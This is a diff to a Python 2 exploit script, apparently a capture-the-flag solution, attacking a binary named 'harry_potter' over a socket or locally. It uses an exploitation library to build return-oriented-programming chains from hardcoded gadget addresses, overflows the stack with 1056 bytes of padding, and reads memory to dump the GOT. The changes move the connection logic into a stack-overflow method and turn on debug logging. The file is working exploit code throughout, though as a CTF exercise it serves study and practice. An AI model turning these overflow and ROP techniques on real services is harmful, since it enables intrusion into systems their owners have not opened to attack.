@@ -4,6 +4,7 @@ import os
 import sys
 import struct
 import socket
+import logging
 import puppeteer as p
 #import time
 
@@ -23,8 +24,11 @@ portport = 666 if hostname != 'localhost' else 6666
 class Harry(p.Manipulator):
     def __init__(self, host, port): # pylint: disable=unused-argument
         p.Manipulator.__init__(self, arch=p.amd64)
-        self.host = host
-        self.port = port
+
+        if host != 'file':
+            self.auto_connection = p.Connection(host=host, port=port)
+        else:
+            self.auto_connection = p.Connection(exe="./harry_potter")
 
         self.G_PRINT = self.gadget(0x400F95) # probably clobbers just about everything
         self.G_POP_RBX = self.gadget(0x401355, pops={'rbx': 0, 'rbp': 1})
@@ -67,15 +71,18 @@ class Harry(p.Manipulator):
             rop += self.rop_write_byte(addr + n, ord(c))
         return rop
 
+    @p.crashes
+    @p.stack_overflow()
+    def boom(self, exploit):
+        print "BOOM"
+        self.auto_connection.read_until('reward!\n')
+        self.auto_connection.send(exploit)
+        self.auto_connection.shutdown(socket.SHUT_WR)
+        self.auto_connection.read_until('read\n')
+        r = self.auto_connection.recv(8192)
+        return r
+
     def fire_rop(self, payload):
-        if self.host != 'file':
-            c = p.Connection(host=self.host, port=self.port)
-        else:
-            c = p.Connection(exe="./harry_potter")
-
-        #c.read(len('If you guess the password, I will give you a reward!\n'))
-        c.read_until('reward!\n')
-
         # padding
         rop = 'A' * 1056
 
@@ -89,18 +96,7 @@ class Harry(p.Manipulator):
         exploit = struct.pack('<I', len(rop) + 10) + rop.build()
 
         open("sent_exploit", "wb").write(exploit)
-
-        c.send(exploit)
-
-        #if self.host != 'filename':
-        c.shutdown(socket.SHUT_WR)
-        #else: out_f.close()
-        #c.read(len('EXCEPTION: Error during read\n'))
-        c.read_until('read\n')
-
-        r = c.recv(8192)
-        #r = in_f.read()
-        #print "BOOM:", repr(r)
+        r = self.do_stack_overflow(exploit)
         return r[:-1]
 
     # clobbers the qword before and qword after
@@ -179,7 +175,7 @@ class Harry(p.Manipulator):
 
         return self.fire_rop(rop)
 
-    @p.memory_read_flags(safe=False)
+    @p.memory_read()
     def read_crash(self, addr, length):
         rop = self.rop_puts(addr)
         return self.fire_rop(rop)[:length]
@@ -203,6 +199,10 @@ def main():
     #for i in range(1, 26):
     #   h = Harry(hostname, portport)
     #   h.dump_got_neighborhood(i)
+
+    logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
+    logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)
+    logging.getLogger("puppeteer.connection").setLevel(logging.INFO)
 
     print "DUMPING AREA AROUND READ"
     h = Harry(hostname, portport)
